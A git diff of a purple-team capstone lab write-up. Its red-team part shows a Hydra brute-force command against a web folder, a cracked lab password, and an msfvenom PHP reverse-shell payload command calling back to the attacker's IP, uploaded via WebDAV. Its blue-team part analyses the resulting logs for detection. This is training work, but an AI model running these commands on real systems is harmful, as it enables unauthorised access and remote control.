@@ -59,7 +59,7 @@ systemctl restart packetbeat
 ```
 
 
-## Time To Attack!
+## Red Team Engagement
 
 Today, I will act as an offensive security Red Teamer to exploit a vulnerable Capstone Virtual Machine.
 
@@ -100,7 +100,7 @@ Next, I open a web browser to access the webserver:
 ![webserver_webdirectory](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webserver_web_directory.png)
 
 
-Next, I am tasked with finding a secret folder and break into it.
+### Next, I am tasked with finding a secret folder and break into it. I used Firefox to navigate to the address of the webserver and start my reconnaissance work.
 
 After reading the company's blog I found a lead on the location of the secret folder:
 
@@ -114,7 +114,8 @@ Next, in the "meet our team" section I found an interesting text file with a clu
 
 ![secret_folder_admin_ashton](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_admin_ashton.png)
 
-Next, I used `Hydra` to brute force the access to the secret folder located at /company_folders/secret_folder.
+
+### Next, I used `Hydra` to brute force the access to the secret folder located at /company_folders/secret_folder.
 
 I used the following command to brute force the access to the web page using `ashton` as the username and the `rockyou.txt` wordlist to brute force his password:
 
@@ -122,29 +123,30 @@ I used the following command to brute force the access to the web page using `as
 hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
 ```
 
-![hydra_brute_forced_password]
+![hydra_brute_forced_password](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/hydra_brute_forced_passwd.png)
 
-Next, I use Ashton's credentials to acces the secret_folder. I found a note that he left to himself, detailing how to connect to the company's webdav server:
+Next, I use Ashton's credentials to acces the 'secret_folder'. I found a note that he left to himself, detailing how to connect to the company's webdav server:
 
-![ashton_instruction_webdav]
+> 192.168.1.105/company_folders/secret_folder/connect_to_corp_server
 
-
-I noticed a hash for ryan's account is displayed on the page. I decided to use the Crack Station website to crack it... And it worked!
-
-![crack_station_cracked_hash]
+![ashton_instruction_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/ashton_instructions_connect_webdav.png)
 
 
-The cracked password is: `linux4u`
+I noticed that a hash for ryan's account is displayed on the page. I decided to use the 'Crack Station' website to crack it. It was successful and I obtained what seems to be a password, i.e., `linux4u`.
+
+![crack_station_cracked_hash](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/Crack_station_cracked_hash.png)
 
 
-Next, from the details left by Ashton on how to connect to the Webdav server, I figured out the path using the updated IP address of their server and successfully accessed the login windows and authenticated with the cracked credentials   `Ryan:linux4u`:
+Next, from the details left by Ashton on how to connect to the Webdav server, I figured out the path using the updated IP address (current address of the webserver 192.168.1.105) of their server and successfully accessed the login window and authenticated with the cracked credentials   `Ryan:linux4u` (i.e., Username: `Ryan` and password: `linux4u`).
 
- ![]
-![]
-![]
+![enter_pass_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/enter_pass_webdav.png)
+
+**Successfully logged in:**
+
+![webdav_success_access](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webdav_success_access.png)
 
 
-Following the successful connection to the Webdav server, I am tasked with dropping a PHP reverse Shell payload.
+### Following the successful connection to the Webdav server, I dropped a PHP reverse Shell payload to gain remote access.
 
 I used `msfvenom` to create my payload file named `exploit.php` with the following command:
 
@@ -152,79 +154,67 @@ I used `msfvenom` to create my payload file named `exploit.php` with the followi
 /usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 R > exploit.php
 ```
 
-![php_payload_creation]
+![php_payload_creation](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/php_payload_creation.png)
 
 
 Next, I uploaded the reverse shell payload (exploit.php file) into the Webdav server:
 
-![copy_paste_exploitPHP_in_webdav]
+![copy_paste_exploitPHP_in_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/copy_paste_exploitPHP_in_webdav.png)
 
 
 
-# Day 2
-
-Part one: turning on the beats (add screenshots)
-
-# Dashboard Creation
+# Blue Team Forensics
 
 
-Add screenshots in order to show how to create dashboards
-
-add screenshot of the full dashboard:
-
-![full_dashboard_part1]
-
-![full_dashboard_part2]
+## Identifying the offensive traffic
 
 
-## Identify the offensive traffic.
+A considerable amount of data is available in the logs. Upon inspection, I was able to identify the malicious traffic and activity generated by my attacking machine.
+Through the log inspection, I was able to obtain the following evidence of malicious activity:
 
-### Identify the traffic between your machine and the web machine:
+- Traffic between my attacking VM and target VM, more specifically, the unusually high volume of requests
+- Acces to the 'secret_folder' directory
+- The brute force attack against the HTTP server
+- The POST request corresponding to the upload of the 'exploit.php' file
 
- - When did the interaction occur?
+Below, the unusually high volume of requests and failed responses between my attacking VM and the target:
 
- the interaction occured between Sep 15, 2021 @ 02:10:00 and Sep 15, 2021 @ 2:20:00
 
- ![when_interaction_occured]
+![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan.png)
+
+![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan_2.png)
+
+![error_vs_success_transac](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_attack_error_vs_successful_transac.png)
+
+I can see that the port scan I performed using `nmap` was logged which shows that the interaction between the attacker and the target machines occured on Sep 15, 2021 @ 02:55:00.
+
 
 - What responses did the victim send back?
 
-Since we know when the interaction between my attacking machine and the victim's machine occured, we set the date and time to Sep 15, 2021 @ 02:10:00 and Sep 15, 2021 @ 2:20:00 and refresh our dashboard. Next we look at the top responses that the victim's machine sent back from our HTTP Status Codes pie charts. The codes returned are `200`, `303`, `204`:
+Since I know when the interaction between my attacking machine and the target machine occured, I set the date and time to Sep 15, 2021 @ 02:55:00 and refresh my "HTTP Status Codes For The Top Queries" dashboard. Next, I looked at the top responses that the target machine sent back from my dashboard. The codes returned are `401`, `301`, `200`, `403`, `204`:
 
-![responses_sent_back_by_victim]
-![error_responses_sent_back_by_victim]
-
-
-- What data is concerning from the Blue Team perspective?
-
-The data that is concerning is the spike in `Connections over time` as seen in the screenshot below:
-
-![concerning spike in connections]
-
-As well as the spike in `Errors vs Successful Transactions` as seen below:
-
-![errors_vs_successful_transac_spike]
+![responses_sent_back_by_victim](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/responses_sent_back_by_victim.png)
 
 
-### Find the request for the hidden directory.
+## Finding the request for the hidden directory
+
+### Access to sensitive data:
+
+107,601 requests were made to the hidden directory 'secret_folder'. between Sep 15, 2021 @ 02:55:00 and Sep 15, 2021 @ 03:12:00
+
+The requests were made from the IP address `192.168.1.90`.
+
+![requested_file_report](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/requested_file_report.png)
+
+Below, the additional requests made after the successful brute force attack, i.e., the attacker successfully gaining access to the 'secret_folder/'. The attacker accessed the folder **6** times out of **107,601** attempts.
 
 
-- How many requests were made to this directory? At what time and from which IP address(es)?
+### HTTP brute force attack
 
-107,601 requests were made to this directory. between Sep 15, 2021 @ 03:03:00 and Sep 15, 2021 @ 03:12:00
+When searching for the `url.path` "/company_folders/secret_folder/", I found the evidence of the HTTP brute force attack allowing me access to the 'secret_folder'. We can see the proof that `Hydra`, the brute force tool was used by looking at the section `user_agent.original`:
 
-The requests were made from the IP address `192.168.1.90`
+![brute_force_hydra_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_Hydra_clue.png)
 
-![secret_directory_requests_number]
-
-![secret_directory_requests_details]
-
-
-- Which files were requested? What information did they contain?
-
-![connect_to_corp_file]
-
-![exploit_php_file]
 
 
 - What kind of alarm would you set to detect this behavior in the future?
@@ -257,7 +247,7 @@ user_agent.original : *Hydra*
 
 - How many requests were made in the brute-force attack? How many requests had the attacker made before discovering the correct password in this one?
 
-107,601 brute force attack requests were made. And out of these only 2 were successful (the file inside was accesses twice).
+107,601 brute force attack requests were made. And out of these only 2 were successful (the file inside was accessed twice).
 
 
 ![brute_force_attack_request]
